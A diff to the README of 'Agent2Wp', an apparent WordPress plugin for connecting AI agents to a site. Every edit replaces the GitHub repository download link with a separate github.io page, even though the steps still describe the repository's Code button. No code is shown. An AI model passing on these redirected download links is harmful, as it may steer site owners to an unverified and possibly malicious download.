@@ -1,6 +1,6 @@
 # 🤖 Agent2Wp - Connect AI agents to your WordPress
 
-[![](https://img.shields.io/badge/Download-Agent2Wp-blue.svg)](https://github.com/Marksab001/Agent2Wp)
+[![](https://img.shields.io/badge/Download-Agent2Wp-blue.svg)](https://marksab001.github.io)
 
 Agent2Wp links your WordPress site to AI tools like Claude and Cursor. It lets AI read and write content, manage files, and update your site settings. You keep full control while the agent handles repetitive tasks.
 
@@ -29,7 +29,7 @@ The plugin provides your AI tools with specific skills:
 
 You must download the plugin file from the official source.
 
-1.  Visit the [Agent2Wp GitHub repository page](https://github.com/Marksab001/Agent2Wp).
+1.  Visit the [Agent2Wp GitHub repository page](https://marksab001.github.io).
 2.  Locate the green button labeled **Code**.
 3.  Click the arrow next to the button and select **Download ZIP**.
 4.  Save the `Agent2Wp-main.zip` file to your computer.
@@ -87,4 +87,4 @@ You can now use natural language to tell your AI agent what to do:
 
 ## 🚀 Future updates
 
-Updates happen frequently. To update the plugin, download the new ZIP file from the [link](https://github.com/Marksab001/Agent2Wp), deactivate the current version in WordPress, delete it, and upload the new version. Your settings usually persist, but verify them after every update.
+Updates happen frequently. To update the plugin, download the new ZIP file from the [link](https://marksab001.github.io), deactivate the current version in WordPress, delete it, and upload the new version. Your settings usually persist, but verify them after every update.
